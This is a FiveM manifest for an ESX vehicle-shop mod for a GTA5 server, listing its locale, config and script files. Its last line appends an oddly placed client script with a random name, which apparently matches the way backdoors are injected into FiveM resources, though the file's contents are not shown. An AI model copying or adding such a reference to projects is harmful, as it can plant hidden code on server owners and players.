fx_version 'bodacious'
game 'gta5'

description 'ESX Vehicle Shop'

version '1.1.0'

server_scripts {
	'@mysql_async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'config.lua',
	'client/utils.lua',
	'client/main.lua'
}

dependency 'essentialmode'

export 'GeneratePlate'
client_script "DISqkiIEcVydGenWnD.lua"